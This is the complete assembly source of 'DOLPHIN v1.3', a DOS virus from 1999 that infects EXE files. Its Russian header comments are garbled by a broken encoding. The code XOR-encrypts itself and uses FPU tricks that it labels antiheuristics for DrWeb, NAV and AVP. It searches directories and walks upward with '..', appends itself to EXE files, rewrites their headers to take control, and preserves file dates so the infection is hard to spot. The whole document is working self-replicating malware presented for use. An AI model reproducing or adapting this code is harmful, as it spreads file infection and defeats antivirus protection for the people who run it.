   ;
   ;                           << DOLPHIN v1.3 >>
   ;                                              ...Šâ® ¡ë çâ® ¥ £®¢®à¨« -
   ;                                                 Ÿ ¡ã¤ã ¦¨âì...
   ;                                                            „…‹œ”ˆ*.
   ;
   ; *¥à¥§¨¤¥âë© *.…•…-¨ä¥ªâ®à.
   ; - ‘®åà ï¥â  âà¨¡ãâë ä ©« 
   ; - ‘®åà ï¥â ¤ âã/¢à¥¬ï ä ©« 
   ; - ¯à®¢¥àï¥â  : § à ¦ñ®áâì, …•…è®áâì, ®¢¥à«¥¨, WINDOWS®á®âì.
   ; - ‡ è¨äà®¢  ¯¥à¥¬¥ë¬ ª«îç®¬ (ª«îç § ¢¨á¨â ®â à §¬¥à  § à ¦ ¥¬®£® ä ©« )
   ; - *à¨ § ç¥¨¨ ¬¨ãâ = 0 á®®¡é ¥â á¢®¨ ¯ á¯®àâë¥ ¤ ë¥.
   ; - “áâ ®¢«¥ ®¡å®¤ ª â «®£®¢ ¯® ¬¥â®¤ã DOT-DOT
   ;
   ; - *… ®¯à¥¤¥«ï¥âáï á«¥¤ãîé¨¬¨ ¯à®£à ¬¬ ¬¨:
   ; DrWeb - OK
   ; NAV   - OK
   ; AVP   - OK
   ;
   ; 25.09.1999.                                       (C) GOBLEEN WARRIORS INC.

                           .model tiny
                           .286
                           .code
                           org 100h
   start:                  jmp virus
   ourhost                 db 0cdh,20h,0

   ;delta
   virus:                  call delta
   delta:                  pop bp
                           sub bp,offset delta

   ;code segment = data segment
                           push es
                           push ds

                           push cs
                           pop ds

   ;uncrypt
                           mov al,[bp+key]   ;
                           sub ax,5          ;
                           mov [bp+x],ax     ;
                           mov [bp+y],0005   ;
                           fild [bp+x]       ;
                           fild [bp+y]       ; Antiheuristics for :
                           fadd              ; DrWeb, NAV, AVP,
                           fistp [bp+z]      ; & maybe smth else
                           mov ax,[bp+z]     ;
                           mov dl,al         ;

                           mov cx,cryptend-cryptstart
                           lea si,[bp+cryptstart]
                           mov di,si
   do_it:                  mov al,[si]
                           inc si
                           xor al,dl
                           mov [di],al
                           inc di
                           loop do_it

   ;store original parts of header in stack
   cryptstart:             push [bp+ReloSS]
                           push [bp+ExeSP]
                           push [bp+ExeIP]
                           push [bp+ReloCS]

   ;make ready JMP offset (_cs)  (JMP ip cs)
                           mov ax,word ptr [bp+ReloCS]
                           mov word ptr [bp+_cs],ax

   ;set new DTA
                           mov ah,1ah
                           lea dx,[bp+newDTA]
                           int 21h

   ;save current dir
                           mov ah,47h
                           xor dl,dl
                           lea si,[bp+cur_dir]
                           int 21h
                           mov byte ptr [bp+counter],0 ;set the counter for infection

   ;findfirst
   findfirst:              mov ah,4eh
                           mov cx,7
   next:                   cmp byte ptr [bp+counter],5 ;check for counter
                           je is_it_time
                           lea dx,[bp+maska]
                           int 21h
                           jnc infect

   ;DOT-DOT
                           mov ah,3bh
                           lea dx,[bp+dot_dot]
                           int 21h
                           jnc findfirst

   ;restore current dir
                           mov ah,3bh
                           lea dx,[bp+cur_dir]
                           int 21h

   ;is it time to said about us?
   is_it_time:             mov ah,2ch
                           int 21h
                           cmp cl,00
                           jne no_messa
                           mov bx,1
                           mov cx,enmess-stmess
                           lea dx,[bp+ourname]
                           call near ptr write
   ;return to host
   no_messa:               pop [bp+ReloCS]
                           pop [bp+ExeIP]
                           pop [bp+ExeSP]
                           pop [bp+ReloSS]

                           mov ah,1ah
                           mov dx,80h
                           int 21h

                           pop ds
                           pop es

                           mov ax,es
                           add ax,10h
                           add word ptr [bp+_cs],ax

                           mov bx,word ptr [bp+ExeIP]
                           mov word ptr [bp+_ip],bx

                           cli
                           mov sp,word ptr [bp+ExeSP]
                           add ax,word ptr [bp+ReloSS]
                           mov ss,ax
                           sti

                           xor ax,ax
                           xor bx,bx
                           xor cx,cx
                           xor dx,dx
                           xor di,di
                           xor si,si
                           xor bp,bp

                           db 0eah
   _ip                     dw ?
   _cs                     dw ?

   ;set atrib to arch
   infect:                 mov ax,4301h
                           xor cx,cx
                           lea dx,[bp+newDTA+1eh]
                           int 21h

   ;open file
                           mov ax,3d02h
                           lea dx,[bp+newDTA+1eh]
                           int 21h
                           xchg ax,bx

   ;read header to buffer header
                           mov ah,3fh
                           mov cx,1ch
                           lea dx,[bp+header]
                           int 21h

   ;check for EXE
                           cmp word ptr [bp+header],'ZM'
                           je stillinfect

   ;close file
   close:                  mov ah,3eh
                           int 21h

   ;restore atrib
                           mov ax,4301h
                           mov cx,word ptr [bp+newDTA+15h]
                           lea dx,[bp+newDTA+1eh]
                           int 21h

   ;findnext
   findnext:               mov ah,4fh
                           jmp next

   ;check for overlay
   stillinfect:            cmp word ptr [bp+header+1ah],0
                           jne close

   ;check for WINDOWS file
                           cmp byte ptr [bp+header+18h],'@'
                           je close

   ;check for our presence
                           cmp word ptr [bp+header+10h],id
                           je close

   ;save main parts of header
                           mov ax,word ptr [bp+header+0eh]
                           mov word ptr [bp+ReloSS],ax
                           mov ax,word ptr [bp+header+10h]
                           mov word ptr [bp+ExeSP],ax
                           mov ax,word ptr [bp+header+14h]
                           mov word ptr [bp+ExeIP],ax
                           mov ax,word ptr [bp+header+16h]
                           mov word ptr [bp+ReloCS],ax

   ;pointer to EOF
                           mov ax,4202h
                           xor cx,cx
                           cwd
                           int 21h

                           push ax dx

   ;change key
                           mov [bp+key],al
                           or al,al
                           jnz allok
                           inc [bp+key]

   ;calc new PageCnt & PartPag
   allok:                  add ax,virlen
                           adc dx,0
                           mov cx,512
                           div cx
                           inc ax
                           mov word ptr [bp+header+4],ax
                           mov word ptr [bp+header+2],dx

   ;calc new main parts
                           pop dx ax
                           push bx

                           mov bx,word ptr [bp+header+8h]
                           mov cl,4
                           shl bx,cl

                           sub ax,bx
                           sbb dx,0

                           mov cx,10h
                           div cx

                           mov word ptr [bp+header+0eh],ax
                           mov word ptr [bp+header+10h],id
                           mov word ptr [bp+header+14h],dx
                           mov word ptr [bp+header+16h],ax

                           pop bx

   ;write 1st uncrypted part EOF
                           mov cx,cryptstart-virus
                           lea dx,[bp+virus]
                           call near ptr write

   ;crypt another and write it
                           mov cx,cryptend-cryptstart
                           lea si,[bp+cryptstart]
                           lea di,[bp+cryptbuff]
   do_else:                mov al,[si]
                           inc si
                           xor al,[bp+key]
                           mov [di],al
                           inc di
                           loop do_else

   ;write crypted part
                           mov cx,cryptend-cryptstart
                           lea dx,[bp+cryptbuff]
                           call near ptr write

   ;write 2nd uncrypted part (KEY)
                           mov cx,virend-cryptend
                           lea dx,[bp+cryptend]
                           call near ptr write

   ;pointer to BOF
                           mov ax,4200h
                           xor cx,cx
                           cwd
                           int 21h

   ;write new header
                           mov cx,1ch
                           lea dx,[bp+header]
                           call near ptr write

   ;restore date & time
                           mov ax,5701h
                           mov cx,word ptr [bp+newDTA+16h]
                           mov dx,word ptr [bp+newDTA+18h]
                           int 21h

   ;add 1 to counter
                           add byte ptr [bp+counter],1
                           jmp close

   ;soubroutine WRITE
                           write proc near
                           mov ah,40h
                           int 21h
                           retn
                           write endp

   ;DATABANK
   stmess:
   ourname                 db '[DOLPHIN] by GOBLEEN WARRIORS INC.'
   enmess:
   maska                   db '*.e*',0
   ReloSS                  dw ?
   ExeSP                   dw ?
   ExeIP                   dw ?
   ReloCS                  dw 0fff0h
   dot_dot                 db '..',0
   cryptend:
   key                     db 0
   virend:
   virlen                  equ virend-virus
   id                      equ '  '   ;20h 20h
   newDTA                  db 43 dup (?)
   header                  db 1ch dup (?)
   cryptbuff               db cryptend-cryptstart dup (?)
   cur_dir                 db 64 dup (?)
   counter                 db ?
   x                       dw ?
   y                       dw ?
   z                       dw ?

   end start
